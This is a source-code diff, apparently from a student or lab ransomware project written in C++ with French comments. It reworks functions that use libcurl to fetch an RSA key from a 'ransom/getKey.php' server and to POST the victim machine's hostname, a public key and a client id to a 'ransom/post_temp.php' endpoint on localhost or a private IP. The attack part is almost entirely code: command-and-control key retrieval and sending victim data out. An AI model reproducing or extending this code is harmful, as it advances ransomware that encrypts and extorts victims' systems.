@@ -61,8 +61,7 @@ unsigned char* generate_key(const unsigned char* pubkey)
 	fgets(msg, 2048 / 8, stdin);
 	msg[strlen(msg) - 1] = '\0'; //get rid of the newline character
 
-								 //let's encrypt
-								 //cout << RSA_size(r) << endl;
+	//let's encrypt
 	encrypt = (unsigned char*)malloc(RSA_size(r));
 	err = malloc(130);
 	if ((encrypt_length = RSA_public_encrypt(strlen(msg) + 1, (unsigned char*)msg, (unsigned char*)encrypt, r, RSA_PKCS1_OAEP_PADDING)) == -1) {
@@ -71,21 +70,8 @@ unsigned char* generate_key(const unsigned char* pubkey)
 		fprintf(stderr, "Error encrypting message :\n %s\n", err);
 	}
 
-	cout << "message chiffree =\n " << encrypt << endl;
-	cout << "end of encryption" << endl;
-
-	//let's decrypt
-	/*decrypt = malloc(RSA_size(r));
-	if (RSA_private_decrypt(encrypt_length, (unsigned char*)encrypt, (unsigned char*)decrypt, r, RSA_PKCS1_OAEP_PADDING) == -1) {
-	ERR_load_crypto_strings();
-	ERR_error_string(ERR_get_error(), (char*) err);
-	fprintf(stderr, "Error decrypting message: %s\n", err);
-	}
-	else {
-	printf("Decrypted message : %s\n", decrypt);
-	}*/
-
-
+	//cout << "message chiffree =\n " << encrypt << endl;
+	//cout << "end of encryption" << endl;
 
 	// 4. free
 free_all:
@@ -121,9 +107,8 @@ const unsigned char* getKey() {
 		just as well be a https:// URL if that is what should receive the
 		data. */
 		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/ransom/getKey.php");
-		//curl_easy_setopt(curl, CURLOPT_URL, "https://requestb.in/qoekryqo");
-		/* Now specify the POST data */
-		//curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "rsa_message=Uo┴Hâ ¡+þ¨♦_´ðÈ·³a;kù8Ñ┐õÃ¢,Gâ/☻♠↨~ÜÆ▬Ë☺╠∟óÞ▬zL÷«-Þv☺>↑‼xæE£v9l©§jr@´ùº´$/³$pÆ.═zïÅOo)°`.Ðü¶oTV→È═¯¶ÑÙ£çLu øıµL♂8☻Õ▄1ºk`±*│²²²²PìE&rsa_pukey= -----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCoGtC0xeFLoyE5QDDtLMyo6kvzTG4WPOePpIz78z7dvDcQ/3+OxKJiRGL+qkA3ydYKYBuneNfyJpyevIrAttWtqu6B4P/J8LGwiV1WM1/ghLM6H+YUNhS9/JOKfpOZiBVB1tj++tgMkF1Nssfh+Z+tFszU77KYDbvUedwJwd44hQIDAQAB-----END PUBLIC KEY-----");
+		//curl_easy_setopt(curl, CURLOPT_URL, "http://172.16.96.9/ransom/getKey.php");
+
 
 		/* Perform the request, res will get the return code */
 
@@ -136,7 +121,7 @@ const unsigned char* getKey() {
 		}
 
 		//print the response
-		cout << "la cle recuperee =\n " << (response) << endl;
+		//cout << "la cle recuperee =\n " << (response) << endl;
 		ret = new const unsigned char[response.length() + 1];
 		strcpy((char *)ret, response.c_str());
 
@@ -151,15 +136,16 @@ const unsigned char* getKey() {
 
 
 
-int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey) {
+int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey, int id) {
 
 	CURL *curl;
 	CURLcode res;
 	string response = "";
 	const unsigned char* ret = new const unsigned char[response.length() + 1];
 
-	std::string msg((char*)cypher);
-	std::string key((char*)pubkey);
+	string hostname((char*)cypher);
+	string key((char*)pubkey);
+	string idClient = to_string(id);
 
 	/* In windows, this will init the winsock stuff */
 	curl_global_init(CURL_GLOBAL_ALL);
@@ -170,15 +156,12 @@ int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey)
 		/* First set the URL that is about to receive our POST. This URL can
 		just as well be a https:// URL if that is what should receive the
 		data. */
-		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/ransom/post.php");
-		//curl_easy_setopt(curl, CURLOPT_URL, "https://requestb.in/qoekryqo");
+		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/ransom/post_temp.php");
+		//curl_easy_setopt(curl, CURLOPT_URL, "https://requestb.in/1fbd5kn1");
 		/* Now specify the POST data */
 
-		string data = "rsa_pukey=" + key + "&rsa_message=" + msg;
-		//string data = "rsa_message=bopbop&rsa_pukey=bolopbolop";
-		//cout << "rsa_message =\n " << msg << endl;
-		//cout << "rsa_pubkey =\n " << key << endl;
-		cout << "\n\n\n" << data << "\n\n\n" << endl;
+		string data = "machineName=" + hostname + "&publickey=" + key + "&id=" + idClient;
+		//cout << "\n\n\n" << data << "\n\n\n" << endl;
 		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
 		/* Perform the request, res will get the return code */
@@ -192,7 +175,7 @@ int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey)
 		}
 
 		//print the response
-		cout << "la réponse du serveur est : " << (response) << endl;
+		//cout << "la réponse du serveur est : " << (response) << endl;
 
 		/* always cleanup */
 		curl_easy_cleanup(curl);
